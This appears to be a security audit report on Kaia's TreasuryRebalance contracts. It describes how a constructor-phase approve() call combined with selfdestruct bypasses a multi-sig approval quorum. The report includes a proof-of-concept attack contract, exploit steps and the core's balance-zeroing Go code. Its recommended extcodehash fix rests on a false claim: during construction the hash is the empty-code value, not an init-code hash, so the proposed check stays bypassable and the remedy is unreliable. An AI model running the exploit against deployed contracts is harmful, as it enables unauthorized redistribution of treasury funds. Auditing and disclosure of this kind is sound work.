### Title
`extcodesize`-Based `isContractAddr` Allows Constructor-Phase Approval Bypass in Treasury Rebalance Governance — (`contracts/testing/system_contracts/TreasuryRebalance.sol`, `TreasuryRebalanceV2.sol`)

### Summary

`TreasuryRebalance` and `TreasuryRebalanceV2` implement a custom `isContractAddr` helper using `extcodesize` to distinguish EOA retired/zeroed addresses from contract addresses and route approval logic accordingly. Because `extcodesize` returns `0` during a contract's constructor execution, a contract calling `approve()` from its own constructor is misclassified as an EOA. This lets a single deployer record a valid approval for a multi-sig retired address without satisfying the required quorum, and — combined with a subsequent self-destruct — causes `checkRetiredsApproved` / `checkZeroedsApproved` to also take the EOA path and accept the single-approver record as sufficient. The result is that the treasury rebalance can be finalized and executed by the Kaia core without the genuine consent of the multi-sig owners of the retired treasury address.

### Finding Description

**Root cause — `isContractAddr` uses `extcodesize`:** [1](#0-0) [2](#0-1) 

Both contracts implement the same inline assembly:
```solidity
function isContractAddr(address _addr) public view returns (bool) {
    uint256 size;
    assembly { size := extcodesize(_addr) }
    return size > 0;
}
```

`extcodesize` returns `0` for any address whose constructor has not yet finished, so a contract calling outward during its own constructor appears to be an EOA.

**How `approve()` branches on this result:** [3](#0-2) [4](#0-3) 

```solidity
bool isContract = isContractAddr(_retiredAddress);
if (!isContract) {
    // EOA path — only requires msg.sender == _retiredAddress
    require(msg.sender == _retiredAddress, "retiredAddress is not the msg.sender");
    _updateApprover(_retiredAddress, msg.sender);
} else {
    // Contract path — requires msg.sender to be in adminList with quorum
    (address[] memory adminList, ) = _getState(_retiredAddress);
    require(_validateAdmin(msg.sender, adminList), "msg.sender is not the admin");
    _updateApprover(_retiredAddress, msg.sender);
}
```

When a contract at address `C` calls `approve(C)` from its own constructor:
- `isContractAddr(C)` → `false` (extcodesize = 0)
- EOA path is taken
- `require(msg.sender == C)` → satisfied because `msg.sender` IS `C` during construction
- Approval is recorded with `C` as the sole approver

**How `checkRetiredsApproved` / `checkZeroedsApproved` is also bypassed:** [5](#0-4) [6](#0-5) 

These functions are called inside `finalizeApproval()`. They also call `isContractAddr`. If the contract at `C` self-destructs after recording the approval, `extcodesize(C)` returns `0` again, so the EOA branch is taken:
```solidity
} else {
    require(retired.approvers.length == 1, "EOA should approve");
}
```
One approver was recorded → check passes → `finalizeApproval()` succeeds.

**End-to-end exploit path:**

1. Owner registers a pre-computed CREATE2 address `C` as a retired/zeroed address (the owner believes `C` will be a legitimate multi-sig contract requiring N-of-M approval).
2. Owner calls `finalizeRegistration()`.
3. Attacker (who controls the CREATE2 salt/deployer) deploys a contract at `C` whose constructor:
   - calls `approve(C)` on the TreasuryRebalance contract → EOA path → approval recorded
   - calls `selfdestruct(attacker_wallet)` → `C` is now empty, `extcodesize(C) = 0`
4. `checkRetiredsApproved()` sees `isContractAddr(C) = false` → EOA path → `approvers.length == 1` → passes.
5. Owner calls `finalizeApproval()` → succeeds (status → Approved).
6. At `rebalanceBlockNumber`, the Kaia core executes `RebalanceTreasury`, which reads the Approved status and zeroes `C`'s balance. [7](#0-6) 

### Impact Explanation

The treasury rebalance (`KIP-103` / `KIP-160`) is a hard-fork-level state change executed by the Kaia core that **permanently zeroes the on-chain balance of retired treasury addresses and redistributes funds to newbie addresses**. Bypassing the approval gate means this irreversible redistribution can be triggered without the genuine consent of the multi-sig owners of the retired address. The corrupted value is the `approvers` array for the retired entry, which records a single self-approving entry instead of the required quorum of distinct human admins. The downstream effect is an unauthorized `state.SetBalance(addr, big.NewInt(0))` on a treasury address at the hard-fork block. [8](#0-7) 

### Likelihood Explanation

The attack requires the owner to register a pre-computed address before deployment (realistic in a planned rebalance setup-up), and the attacker to control the CREATE2 deployment at that address. Alternatively, if a registered multi-sig contract supports `selfdestruct` and CREATE2 redeployment, a single malicious admin can execute the attack unilaterally. The `TreasuryRebalance` contract has already been used for KIP-103 on mainnet, and `TreasuryRebalanceV2` is the active contract for KIP-160, making this a live production surface.

### Recommendation

Replace the inline `extcodesize` check with a check that is not bypassable during construction. The simplest fix is to use `extcodehash`:

```solidity
function isContractAddr(address _addr) public view returns (bool) {
    bytes32 h;
    assembly { h := extcodehash(_addr) }
    // 0x0 = non-existent account; keccak256("") = empty EOA
    return h != 0x0 && h != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
}
```

This returns `true` even during a contract's constructor (the hash of the init code is non-zero), closing the bypass. Alternatively, adopt OpenZeppelin's `Address.isContract` from a version that uses `extcodehash` (≥ v2.5.0), consistent with the recommendation in the original external report.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface ITreasuryRebalance {
    function approve(address _retiredAddress) external;
}

contract MaliciousRetired {
    constructor(address treasuryRebalance, address payable attacker) {
        // During construction extcodesize(address(this)) == 0
        // so isContractAddr(address(this)) returns false
        // EOA path: require(msg.sender == address(this)) passes
        ITreasuryRebalance(treasuryRebalance).approve(address(this));
        // Self-destruct so extcodesize stays 0 for checkRetiredsApproved
        selfdestruct(attacker);
    }
}
```

**Steps:**
1. Deploy `TreasuryRebalance` with a future `rebalanceBlockNumber`.
2. Call `registerRetired(precomputedAddress)` where `precomputedAddress` is the CREATE2 address of `MaliciousRetired`.
3. Call `finalizeRegistration()`.
4. Deploy `MaliciousRetired` at `precomputedAddress` via CREATE2.
5. Observe: `getRetired(precomputedAddress)` shows 1 approver = `precomputedAddress`.
6. Call `finalizeApproval()` — succeeds despite no legitimate multi-sig quorum.
7. At `rebalanceBlockNumber`, the core zeroes the balance of `precomputedAddress`.

func RebalanceTreasury(state *state.StateDB, chain backends.BlockChainForCaller, header *types.Header) (*rebalanceResult, error) {
	var (
		err    error
		caller RebalanceCaller

		result   = newRebalanceReceipt()
		isKIP160 = chain.Config().IsKIP160ForkBlock(header.Number)
		isKIP103 = chain.Config().IsKIP103ForkBlock(header.Number)
	)

	if isKIP160 {
		caller, err = rebalance.NewTreasuryRebalanceV2Caller(chain.Config().Kip160ContractAddress, backends.NewBlockchainContractBackend(chain, nil, nil))
	} else if isKIP103 {
		caller, err = NewKip103ContractCaller(state, chain, header)
	} else {
		return nil, errors.New("rebalancing shouldn't be executed unless the block number is kip103 or kip160 hard fork")
	}
	if err != nil {
		return nil, err
	}

	// Retrieve 1) Get Zeroed
	if err = result.fillZeroed(caller, state); err != nil {
		return result, err
	}

	// Retrieve 2) Get Allocated
	if err = result.fillAllocated(caller, state); err != nil {
		return result, err
	}

	// Validation 1) Check the target block number
	if blockNum, err := caller.RebalanceBlockNumber(nil); err != nil || blockNum.Cmp(header.Number) != 0 {
		return result, ErrRebalanceIncorrectBlock
	}

	// Validation 2) Check whether status is approved. It should be 2 meaning approved
	if status, err := caller.Status(nil); err != nil || status != 2 {
		return result, ErrRebalanceBadStatus
	}

	// Validation 3) Check approvals from zeroeds
	if err = caller.CheckZeroedsApproved(nil); err != nil {
		return result, err
	}

	// Validation 4) Check the total balance of zeroeds are bigger than the distributing amount
	totalZeroedAmount := result.totalZeroedBalance()
	totalAllocatedAmount := result.totalAllocatedBalance()
	if isKIP103 && totalZeroedAmount.Cmp(totalAllocatedAmount) < 0 {
		return result, ErrRebalanceNotEnoughBalance
	}

	// Execution 1) Clear all balances of zeroeds
	for addr := range result.Before.Zeroed {
		state.SetBalance(addr, big.NewInt(0))
		result.After.Zeroed[addr] = big.NewInt(0)
	}
	// Execution 2) Distribute KAIA to all allocateds
	for addr, balance := range result.After.Allocated {
		// if an allocated has KAIA before the allocation, it will be burnt
		currentBalance := state.GetBalance(addr)
		result.Burnt.Add(result.Burnt, currentBalance)

		state.SetBalance(addr, balance)
	}

	// Fill the remaining fields of the result
	remainder := new(big.Int).Sub(totalZeroedAmount, totalAllocatedAmount)
	result.Burnt.Add(result.Burnt, remainder)
	result.Success = true
	return result, nil
